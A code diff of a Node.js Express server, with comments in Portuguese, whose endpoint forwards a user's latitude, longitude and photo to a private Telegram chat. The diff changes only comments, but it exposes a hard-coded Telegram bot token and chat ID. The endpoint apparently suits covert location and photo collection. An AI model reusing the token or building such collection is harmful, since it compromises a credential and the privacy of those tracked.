@@ -8,7 +8,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(cors());
-app.use(bodyParser.json({ limit: "10mb" })); // aumentar limite para base64
+app.use(bodyParser.json({ limit: "10mb" })); // Aumenta limite para imagens em base64
 
 const TELEGRAM_BOT_TOKEN = "7674928346:AAEd6FNCSB_ozfmqs7islmmEaH6x8bWivVQ"; // Seu token
 const TELEGRAM_CHAT_ID = "1276935257"; // Seu chat ID
@@ -21,16 +21,15 @@ app.post("/send-location-photo", async (req, res) => {
   }
 
   try {
-    // Envia a mensagem de localização
+    // Envia mensagem com a localização
     const message = `📍 Localização do usuário:\nLatitude: ${latitude}\nLongitude: ${longitude}\n${maps}`;
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
       text: message,
     });
 
-    // Se foto existe, envia ela
+    // Envia foto, se existir
     if (photo) {
-      // Remove prefixo base64
       const base64Data = photo.replace(/^data:image\/\w+;base64,/, "");
       const buffer = Buffer.from(base64Data, "base64");
 
